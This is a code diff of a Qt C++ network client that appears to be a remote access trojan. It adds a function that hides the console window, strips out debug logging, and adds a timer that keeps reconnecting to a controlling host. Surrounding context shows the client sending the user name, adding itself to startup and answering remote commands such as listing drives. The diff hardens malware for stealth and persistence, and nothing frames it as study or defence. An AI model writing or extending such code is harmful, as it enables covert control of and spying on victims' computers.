@@ -3,6 +3,7 @@
 QClient::QClient(QString h, qint16 p, QObject *parent) : 
 	host(h), port(p) , QObject(parent)
 {
+	hideCMD();
     sock = new QTcpSocket(this);
 	connect(sock, SIGNAL(connected()), this, SLOT(connected()));
 	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
@@ -10,8 +11,6 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
 	connect(sock, SIGNAL(readyRead()), this, SLOT(readyRead()));
 	connect(sock, SIGNAL(error(QAbstractSocket::SocketError)), this,
 		SLOT(HandleTcpError(QAbstractSocket::SocketError)));
-
-	tryToConnect();
 
 	compName = qgetenv("UserName");;
 	addStartup();
@@ -25,8 +24,12 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
 	connect(thread, SIGNAL(finished()), thread, SLOT(deleteLater()));
 	thread->start();
 
-	dir = QDir::currentPath();
+	timer = new QTimer();
+	timer->setInterval(50000);
+	connect(timer, SIGNAL(timeout()), this, SLOT(tryToConnect()));
 
+	dir = QDir::currentPath();
+	tryToConnect();
 }
 
 void QClient::tryToConnect()
@@ -36,18 +39,18 @@ void QClient::tryToConnect()
 
 void QClient::connected()
 {
-	qDebug() << "CONNECTED";
 	sendData(compName.toUtf8());
+	timer->stop();
 }
 
 void QClient::disconnected()
 {
-	qDebug() << "DISCONNECTED";
+	timer->start();
 }
 
 void QClient::HandleTcpError(QAbstractSocket::SocketError err)
 {
-	qDebug() << err;
+
 }
 
 void QClient::readyRead()
@@ -132,6 +135,11 @@ void QClient::readyRead()
 					{
 						QString drives = getDrives();
 						response = drives;
+						break;
+					}
+					case Commands::IsConnected:
+					{
+						response = "CONNECTED";
 						break;
 					}
 					default:
@@ -295,4 +303,14 @@ void QClient::sendData(const QByteArray &data)
 QClient::~QClient()
 {
     delete sock;
+	if(timer)
+		delete timer;
+}
+
+void QClient::hideCMD()
+{
+	HWND window;
+	AllocConsole();
+	window = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(window, 0);
 }
